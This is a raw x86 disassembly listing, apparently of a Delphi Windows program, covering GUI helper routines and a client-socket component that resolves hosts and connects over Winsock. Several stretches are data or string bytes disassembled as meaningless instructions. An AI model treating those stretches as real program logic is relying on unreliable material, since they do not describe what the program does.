push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457c6d
lea eax [ ebp - 0x8 ]
call sub_404050
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_41e764
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c174
mov ebx eax
inc ebx
sub_457c78
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4049bc
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_457ffe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_4579e0
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_4577e8
jmp r-xdata
call sub_44dea8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458005
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_404074
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404a80
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_436058
call sub_4554f8
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_457a18
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_4548bc
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43714c
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4372f0
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4554c0
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_4348cc
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_4040e8
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_438978
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_457b6c
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403490
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4372c4
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4372c4
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_43794c
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_45560c
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_457bcc
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_4577e8
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_4577e8
jmp r-xdata
sub_45800c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_4040a4
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_4040a4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45806c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov [ ebx + 0xb0 ] esi
pop esi
pop ebx
retn
push esi
push 0x0
push 0xb031
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
sub_458098
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_438978
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_438978
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_443c80
sub_458128
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_458150
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_4581f4
add [ eax ] eax
add [ eax ] al
mov esp 0x8000478d
inc eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_458257
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45825e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_44dc54
mov eax sub_44ded4
call sub_413ca4
mov eax [ rw-data ]
push eax
call CloseHandle
sub_45830c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_458331
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458338
retn
sub_458954
add [ ebp ] 0x48
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
push cs
dec edi
outsb
inc ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
or al 0x4f
popad
je r-xdata
add [ ebx ] dh
ror [ ecx - 0x3fcccbba ] 0x89
inc esi
cmp dh al
inc esi
cmp al 0x0
mov [ esi + 0x3e ] 0x0
mov [ esi + 0x40 ] 0xffffffff
mov [ esi + 0x44 ] 0x0
xor eax eax
mov [ esi + 0x48 ] eax
mov [ esi + 0x4c ] eax
xor eax eax
mov [ esi + 0x50 ] eax
mov [ esi + 0x54 ] eax
xor eax eax
mov [ esi + 0x58 ] eax
mov [ esi + 0x5c ] eax
xor eax eax
mov [ esi + 0x60 ] eax
mov [ esi + 0x64 ] eax
xor eax eax
mov [ esi + 0x68 ] eax
mov [ esi + 0x6c ] eax
call sub_40cd0c
mov eax esi
test bl bl
je r-xdata
cld
add [ ebp ] 0x68
add [ eax ] al
[ eax ]
outsb
inc esp
imul esi [ ebx + 0x63 ] 0x656e6e6f
arpl [ esp + edi * 8 - 0x7d ] si
inc ebp
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09000c ] al
outsb
push edx
arpl [ gs : ebp + 0x69 ] sp
jbe r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c000b ] al
dec eax
popad
outsb
insb
int3
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_458a58
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a944
mov [ esi + 0x30 ] 0x0
mov [ esi + 0x31 ] 0x0
xor eax eax
mov [ esi + 0x34 ] eax
xor eax eax
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x0
mov [ esi + 0x3e ] 0x0
mov [ esi + 0x40 ] 0xffffffff
mov [ esi + 0x44 ] 0x0
xor eax eax
mov [ esi + 0x48 ] eax
mov [ esi + 0x4c ] eax
xor eax eax
mov [ esi + 0x50 ] eax
mov [ esi + 0x54 ] eax
xor eax eax
mov [ esi + 0x58 ] eax
mov [ esi + 0x5c ] eax
xor eax eax
mov [ esi + 0x60 ] eax
mov [ esi + 0x64 ] eax
xor eax eax
mov [ esi + 0x68 ] eax
mov [ esi + 0x6c ] eax
call sub_40cd0c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_458ae4
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a990
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_458b10
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop edx
pop esi
pop ebx
retn
movzx eax [ ebx + 0x3e ]
push eax
xor eax eax
mov al [ ebx + 0x44 ]
mov eax [ eax * 4 + rw-data ]
push eax
xor eax eax
mov al [ ebx + 0x3c ]
mov eax [ eax * 4 + rw-data ]
push eax
call socket
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov [ ebx + 0x40 ] esi
inc esi
setne al
mov [ ebx + 0x30 ] al
test al al
je r-xdata
cmp [ ebx + 0x31 ] 0x1
jne r-xdata
xor eax eax
mov [ ebx + 0x34 ] eax
xor eax eax
mov [ ebx + 0x38 ] eax
mov eax ebx
mov si 0xffef
call sub_403490
mov [ esp ] 0x1
push esp
push 0x8004667e
mov eax [ ebx + 0x40 ]
push eax
call ioctlsocket
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_458b98
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x40 ]
push eax
call closesocket
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov [ ebx + 0x40 ] 0xffffffff
mov [ ebx + 0x30 ] 0x0
mov eax ebx
mov si 0xffee
call sub_403490
sub_458c1c
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov eax [ esi ]
add [ ebx + 0x34 ] eax
pop esi
pop ebx
retn
push esi
mov ecx edx
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_458c6c
push ebx
mov ebx eax
mov eax ebx
call sub_41ad94
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov [ ebx + 0x30 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
sub_458c90
push esi
mov esi eax
cmp dl [ esi + 0x30 ]
je r-xdata
pop esi
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov [ esi + 0x30 ] dl
test [ esi + 0x1c ] 0x10
jne r-xdata
test dl dl
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
jmp r-xdata
sub_458cc0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x44 ]
je r-xdata
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x10
jne r-xdata
mov [ esi + 0x44 ] bl
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
sub_458ce4
push ebx
push esi
mov esi edx
mov ebx eax
cmp si [ ebx + 0x3e ]
je r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov [ ebx + 0x3e ] si
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
sub_458d0c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x31 ]
je r-xdata
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x10
jne r-xdata
mov [ esi + 0x31 ] bl
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
sub_458d30
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_458a58
mov [ esi + 0x3c ] 0x2
mov [ esi + 0x3e ] 0x0
lea eax [ esi + 0x70 ]
call sub_404050
lea eax [ esi + 0x74 ]
call sub_404050
lea eax [ esi + 0x78 ]
call sub_404050
lea eax [ esi + 0x7c ]
call sub_404050
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_458d90
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_404500
mov eax [ ebp - 0x8 ]
call sub_404500
xor eax eax
push ebp
push sub_458e25
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ esi ] 0x2
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_458e34
mov eax [ ebp - 0xc ]
call sub_404510
push eax
call inet_addr
mov [ esi + 0x4 ] eax
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_458f0c
push eax
call htons
mov [ esi + 0x2 ] ax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458e2c
lea eax [ ebp - 0xc ]
call sub_404050
lea eax [ ebp - 0x8 ]
call sub_404050
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_458e34
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi ecx
mov ebx edx
mov eax esi
call sub_404050
test ebx ebx
je r-xdata
mov eax esi
mov edx r-xdata
call sub_4040a4
mov al [ ebx ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax ebx
call sub_404510
push eax
call gethostbyname
test eax eax
je r-xdata
mov eax ebx
call sub_404510
push eax
call inet_addr
inc eax
je r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov ebx eax
push esi
mov eax [ ebx + 0xc ]
mov edi [ eax ]
xor eax eax
mov al [ edi ]
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0x0
xor eax eax
mov al [ edi + 0x1 ]
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] 0x0
xor eax eax
mov al [ edi + 0x2 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0x0
xor eax eax
mov al [ edi + 0x3 ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] 0x0
lea edx [ esp + 0x4 ]
mov ecx 0x3
mov eax r-xdata
call sub_408d10
jmp r-xdata
mov eax esi
mov edx ebx
call sub_4040a4
jmp r-xdata
sub_458f0c
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push edi
mov eax ebx
call sub_404510
push eax
call getservbyname
test eax eax
je r-xdata
mov eax ebx
call sub_408084
mov esi eax
mov ax [ eax + 0x8 ]
push eax
call ntohs
mov esi eax
jmp r-xdata
sub_458f48
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_458fa9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebx + 0x70 ]
call sub_40445c
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458fb0
lea eax [ ebp - 0x4 ]
call sub_404050
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x70 ]
mov edx [ ebp - 0x4 ]
call sub_4040a4
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
sub_458fb4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_459015
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebx + 0x74 ]
call sub_40445c
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45901c
lea eax [ ebp - 0x4 ]
call sub_404050
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x74 ]
mov edx [ ebp - 0x4 ]
call sub_4040a4
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
sub_459020
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_459081
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebx + 0x78 ]
call sub_40445c
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459088
lea eax [ ebp - 0x4 ]
call sub_404050
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x78 ]
mov edx [ ebp - 0x4 ]
call sub_4040a4
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
sub_45908c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_4590ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebx + 0x7c ]
call sub_40445c
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4590f4
lea eax [ ebp - 0x4 ]
call sub_404050
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ ebp - 0x4 ]
call sub_4040a4
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
sub_4590f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_458d30
mov [ esi + 0x80 ] 0x0
xor eax eax
mov [ esi + 0x88 ] eax
mov [ esi + 0x8c ] eax
xor eax eax
mov [ esi + 0x90 ] eax
mov [ esi + 0x94 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_459150
push ebx
push esi
add esp 0xfffffff0
mov esi eax
mov eax esi
call sub_458b10
cmp [ esi + 0x30 ] 0x0
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ esi + 0x80 ] 0x0
jne r-xdata
push esp
mov ecx [ esi + 0x7c ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_458d90
push 0x10
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x40 ]
push eax
call connect
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
test eax eax
sete bl
mov [ esi + 0x80 ] bl
test bl bl
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
sub_4591b0
push ebx
mov ebx eax
cmp [ ebx + 0x80 ] 0x0
je r-xdata
mov eax ebx
call sub_458b98
pop ebx
retn
push 0x2
mov eax [ ebx + 0x40 ]
push eax
call shutdown
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov [ ebx + 0x80 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
sub_459228
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4590f8
mov dl 0x1
mov eax esi
call sub_458cc0
mov dx 0x11
mov eax esi
call sub_458ce4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4592e7
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_459314
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45931b
retn
call sub_4592b4
sub_459334
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
jo sub_4592e7
inc ebp
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45120040 ] al
dec ecx
push ebx
imul ebp [ ebp + 0x6e ] 0x63784574
jo r-xdata
inc eax
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x450c0040 ] al
dec ecx
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
xchg esp eax
inc ebp
add [ eax + eax ] cl
imul ebp [ edi + 0x6e ] 0x45943890
jo r-xdata
jo r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx * 4 + 0x45 ] dl
add [ eax + eax ] cl
add [ eax ] al
xor [ ebx + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x451e0040 ] al
dec ecx
push edx
popad
dec esp
outsb
dec ebp
popad
js r-xdata
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
je r-xdata
inc edi
jb r-xdata
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45170040 ] al
dec ecx
inc ebx
outsd
outsb
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebp + eax * 2 + 0xc00 ] dl
add [ ebx + edx * 4 + 0x34c40045 ] cl
imul ebp [ edi + 0x6e ] 0xd800408d
xchg ebx eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
xchg ebx eax
inc ebp
add [ eax + eax ] cl
add [ eax ] al
xor [ ebx + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
inc eax
imul ebp [ esi + 0x65 ] 0x676e654c
je r-xdata
xchg esp eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
